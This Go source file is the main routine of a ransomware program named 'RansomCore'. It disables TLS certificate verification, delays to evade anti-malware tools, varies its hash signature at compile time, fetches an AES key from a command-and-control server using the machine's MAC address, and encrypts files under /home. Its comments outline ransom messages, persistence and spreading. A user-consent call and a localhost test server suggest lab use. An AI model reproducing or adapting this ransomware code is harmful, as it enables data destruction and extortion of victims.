package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"time"
)

/**
Steps to take after malware has been deployed:
 1. Talk to Command-and-Control server over SSL to get key
 2. Encrypt user-owned files (not system relevant)
 3. Maybe display Ransom message
 4. Get persistence/Spread further
*/
var TEST_SERVER_URL string  // default: "127.0.0.1"
var TEST_SERVER_PORT string // default: "1200"
// Random compile time value to change ransomware hash signature
var CHANGE_HASH_RANDOM_VALUE string

const TEST_GET_KEY_PATH = "key"
const ENCRYPTION_START_PATH = "/home"

// Idea: To make recovering the deleted original files harder,
// create big zero/random byte files and delete them to overwrite data from
// deleted file inodes

func main() {
	fmt.Println("[+] Started RansomCore!")
	// Detecting operating System and acting accordingly
	if runtime.GOOS == "linux" {
		const ENCRYPTION_START_PATH = "/home"
	} else {
		fmt.Println("Ransomware currently only working on linux (and maybe mac).")
		os.Exit(1)
	}
	CheckUserDecryptFiles()
	GetUserConsent()

	// Creating custom http client that ignores unsafe certificates
	customTransport := &(*http.DefaultTransport.(*http.Transport)) // make shallow copy
	customTransport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{Transport: customTransport}

	// Waking up after certain duration to fool anti-malware mechanisms
	time.Sleep(4 * time.Second)
	fmt.Println("[*] Script starting ...")

	intMacAddr := MacUint64()
	stringMacAddr := FormatUint64MacAddress(intMacAddr)

	aesKey := FetchAesKey(stringMacAddr, client)
	EncryptFromRoot(ENCRYPTION_START_PATH, aesKey, true)
}
